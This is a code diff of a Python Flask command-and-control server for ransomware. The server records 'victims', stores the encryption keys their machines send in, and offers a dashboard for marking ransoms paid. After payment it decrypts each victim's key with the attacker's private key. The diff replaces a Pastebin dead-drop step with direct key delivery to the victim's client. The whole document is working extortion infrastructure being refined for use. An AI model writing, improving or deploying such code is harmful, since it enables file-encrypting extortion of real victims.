@@ -9,11 +9,11 @@ from cryptography.hazmat.backends import default_backend
 import datetime
 
 # --- Configuration ---
-PASTEBIN_API_DEV_KEY = 'YOUR_DEV_KEY_HERE' # Replace with a real Pastebin dev key for full realism
 C2_HOST = '0.0.0.0'
 C2_PORT = 5000
 
 # --- In-Memory "Database" ---
+# Structure: {victim_id: {status: str, encrypted_key: str, decrypted_key: str, first_seen: str}}
 victims = {}
 
 # --- Cryptography Setup ---
@@ -59,20 +59,6 @@ ATTACKER_PUBLIC_KEY = public_key.public_bytes(
     format=serialization.PublicFormat.SubjectPublicKeyInfo
 ).decode('utf-8')
 
-# --- Pastebin Dead Drop ---
-def post_key_to_pastebin(key_content):
-    # For a real simulation, you'd use the API. For this demo, we'll simulate it.
-    # To make it work without a real API key, we'll just print the URL.
-    # In a real scenario, you would use requests.post to the Pastebin API.
-    print(f"[!] ACTION REQUIRED: Post the following key to a public pastebin service:")
-    print("-" * 20)
-    print(key_content)
-    print("-" * 20)
-    # This is a fake URL for demonstration purposes
-    fake_pastebin_url = f"https://pastebin.com/raw/FAKE_ID_FOR_{base64.b64encode(key_content.encode()).decode('utf-8')[:8]}"
-    print(f"-> Simulated Pastebin URL: {fake_pastebin_url}")
-    return fake_pastebin_url
-
 # --- Flask App ---
 app = Flask(__name__)
 
@@ -99,7 +85,7 @@ HTML_TEMPLATE = """
                             <th>Victim ID</th>
                             <th>Status</th>
                             <th>First Seen</th>
-                            <th>Key URL</th>
+                            <th>Decrypted Key (Internal)</th>
                             <th>Action</th>
                         </tr>
                     </thead>
@@ -117,7 +103,13 @@ HTML_TEMPLATE = """
                                 </span>
                             </td>
                             <td>{{ data.first_seen }}</td>
-                            <td><a href="{{ data.key_url }}" target="_blank">{{ data.key_url or 'N/A' }}</a></td>
+                            <td>
+                                {% if data.decrypted_key %}
+                                <span class="text-success">Ready</span>
+                                {% else %}
+                                <span class="text-muted">Locked</span>
+                                {% endif %}
+                            </td>
                             <td>
                                 <form method="post" action="/mark_paid/{{ victim_id }}">
                                     <button type="submit" class="btn btn-sm btn-warning" {{ 'disabled' if data.status != 'UNPAID' }}>
@@ -150,8 +142,8 @@ def checkin():
     victims[victim_id] = {
         "status": "UNPAID",
         "encrypted_key": encrypted_aes_key_b64,
-        "first_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-        "key_url": None
+        "decrypted_key": None,
+        "first_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     }
     print(f"[+] New victim check-in: {victim_id}")
     return jsonify({"victim_id": victim_id})
@@ -162,8 +154,9 @@ def get_status(victim_id):
     if not data:
         return jsonify({"status": "error", "message": "Victim not found"}), 404
 
-    if data['status'] == 'KEY_SENT':
-        return jsonify({"status": "ready", "key_url": data['key_url']})
+    if data['status'] == 'KEY_SENT' and data['decrypted_key']:
+        # Direct key delivery
+        return jsonify({"status": "ready", "key": data['decrypted_key']})
     else:
         return jsonify({"status": "waiting"})
 
@@ -187,11 +180,11 @@ def mark_as_paid(victim_id):
             )
         )
         aes_key_b64 = base64.b64encode(aes_key).decode('utf-8')
-        key_url = post_key_to_pastebin(aes_key_b64)
-
+        
+        # Store the decrypted key in memory for direct delivery
         victims[victim_id]['status'] = 'KEY_SENT'
-        victims[victim_id]['key_url'] = key_url
-        print(f"[+] Decryption key for {victim_id} posted to {key_url}")
+        victims[victim_id]['decrypted_key'] = aes_key_b64
+        print(f"[+] Decryption key for {victim_id} is ready for delivery.")
 
     except Exception as e:
         print(f"[-] Error decrypting key for {victim_id}: {e}")
